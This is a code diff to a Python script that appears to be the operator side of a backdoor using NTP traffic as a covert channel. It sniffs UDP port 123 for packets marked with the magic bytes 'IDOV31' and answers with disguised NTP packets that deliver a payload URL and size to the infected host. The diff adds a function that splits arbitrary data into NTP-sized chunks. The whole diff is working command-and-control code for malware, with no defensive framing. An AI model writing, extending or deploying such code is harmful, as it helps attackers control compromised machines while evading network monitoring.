@@ -14,23 +14,42 @@ END_MALICIOUS_MAGIC = 7
 MALICIOUS_MAGIC = b"IDOV31"
 SCAPY_NTP_FILTER = "udp and port 123"
 
+
+def send_data(data: str, ip_packet):
+    payload = f"\x1b{MALICIOUS_MAGIC.decode()}{data}".encode()
+
+    if len(payload) > DEFAULT_NTP_MESSAGE_SIZE:
+        amount_of_messages = int(len(payload) / DEFAULT_NTP_MESSAGE_SIZE) + 1
+        payload = f"\x1b{MALICIOUS_MAGIC.decode()}{chr(amount_of_messages)}".encode()
+        chunk_size = DEFAULT_NTP_MESSAGE_SIZE - len(f"\x1b{MALICIOUS_MAGIC.decode()}")
+
+        if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
+            payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
+        scapy.send(IP(dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)
+
+        for i in range(0, len(data), chunk_size):
+            sleep(SLEEP)
+            payload = f"\x1b{MALICIOUS_MAGIC.decode()}{data[i:i+chunk_size]}".encode()
+
+            if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
+                payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
+            scapy.send(IP(dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)
+    else:
+        if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
+            payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
+        scapy.send(IP(dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)
+
+
 def main():
-    payload_url = f"\x1b{MALICIOUS_MAGIC.decode()}{sys.argv[2]}".encode()
     payload_size = f"\x1b{MALICIOUS_MAGIC.decode()}{PAYLOAD_SIZE}".encode()
 
-    # Making sure that the payload url and encryption key are in acceptable sizes.
-    if len(payload_url) > DEFAULT_NTP_MESSAGE_SIZE:
-        print("[ - ] Payload url is too long!")
-        sys.exit(1)
-    elif len(payload_url) < DEFAULT_NTP_MESSAGE_SIZE:
-        payload_url += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload_url))
-    
+    # Sending payload size.
     if len(payload_size) > DEFAULT_NTP_MESSAGE_SIZE:
-        print("[ - ] Payload size is too long!")
+        print("[ - ] Payload size is too big.")
         sys.exit(1)
     elif len(payload_size) < DEFAULT_NTP_MESSAGE_SIZE:
         payload_size += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload_size))
-
+    
     # Sniffing NTP packets.
     while True:
         packet = scapy.sniff(iface=sys.argv[1], count=1, filter=SCAPY_NTP_FILTER)
@@ -43,10 +62,9 @@ def main():
             # If got a malicious packet - Activate the backdoor!
             if raw_packet[START_MALICIOUS_MAGIC:END_MALICIOUS_MAGIC] == MALICIOUS_MAGIC:
                 print("[ + ] Got a packet from the backdoor!\n[ ! ] Entering sandman...")
-                scapy.send(IP(dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload_url), verbose=0)
+                send_data(sys.argv[2], ip_packet)
                 scapy.send(IP(dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload_size), verbose=0)
                 print(f"[ + ] Activated the backdoor for {ip_packet.src}!")
-        
         sleep(SLEEP)
 
 def print_banner():
